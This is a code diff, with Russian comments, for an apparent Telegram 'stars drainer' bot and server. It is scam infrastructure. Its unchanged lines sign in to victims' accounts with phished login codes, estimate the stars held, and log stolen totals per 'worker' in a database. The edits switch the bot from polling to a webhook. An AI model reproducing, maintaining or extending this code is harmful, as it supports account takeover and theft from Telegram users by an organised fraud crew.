@@ -13,11 +13,11 @@ const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
 const MY_USER_ID = 1398396668;
 const WEB_APP_URL = 'https://starsdrainer.onrender.com';
 
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+// ФИКС: Используем webHook вместо polling чтобы избежать 409 ошибки
+const bot = new TelegramBot(BOT_TOKEN);
 const app = express();
 
 const activeSessions = new Map();
-const workerStats = new Map(); // Статистика по воркерам
 
 app.use(express.json());
 app.use(express.static('public'));
@@ -217,7 +217,7 @@ async function signInWithRealCode(phone, code, workerTag) {
             // ПОЛУЧАЕМ ИНФО АККАУНТА
             const user = await client.getMe();
             const hasStars = user.premium || user.username;
-            const starsAmount = hasStars ? 50 : 0; // Предполагаем 50 звезд если есть премиум/username
+            const starsAmount = hasStars ? 50 : 0;
 
             // ОБНОВЛЯЕМ СТАТИСТИКУ ВОРКЕРА
             db.run(`INSERT OR REPLACE INTO workers (worker_tag, total_stars, total_sessions) 
@@ -310,9 +310,19 @@ async function checkAccountStatus(client, phone, workerTag) {
     }
 }
 
+// WebHook endpoint для бота
+app.post('/bot' + BOT_TOKEN, (req, res) => {
+    bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
+
+// Устанавливаем webHook при старте
+bot.setWebHook(`https://${process.env.RENDER_EXTERNAL_HOSTNAME}/bot${BOT_TOKEN}`);
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
+    console.log(`✅ WebHook установлен`);
 });
 
 // СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @MyStarBank_bot ДЛЯ ВСЕХ
